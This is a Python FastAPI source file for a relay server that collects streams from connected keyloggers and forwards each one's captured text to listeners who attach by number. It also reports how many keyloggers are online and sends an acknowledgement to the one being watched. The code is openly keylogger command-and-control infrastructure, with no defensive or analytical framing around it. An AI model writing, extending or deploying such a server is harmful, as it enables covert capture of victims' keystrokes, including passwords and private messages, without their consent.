from fastapi import FastAPI, WebSocket
import threading
from fastapi.responses import JSONResponse
from fastapi.encoders import jsonable_encoder
import asyncio


app = FastAPI()


lock = threading.Lock()
keyloggers = dict()


async def send_data(user, data):
    await user.send_text(data)


@app.websocket("/ws")
async def keylogger_websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    with lock:
        global keyloggers
        keyloggers[websocket] = []

    while True:
        data = await websocket.receive_text()
        users = keyloggers[websocket]

        if users:
            tasks = []
            for user in users:
                task = send_data(user, data)
                tasks.append(task)
            await asyncio.gather(*tasks)


@app.get("/check_keyloggers")
async def check_keyloggers_endpoint():
    data = {"total": len(keyloggers)}
    data = jsonable_encoder(data)
    return JSONResponse(content=data)


@app.websocket("/ws/listen/{num_kl}")
async def user_websocket_endpoint(websocket: WebSocket, num_kl: int):
    await websocket.accept()
    ws: WebSocket = list(keyloggers.keys())[num_kl-1]
    keyloggers[ws].append(websocket)
    await ws.send_text("OK")

    while True:
        await websocket.receive_text()


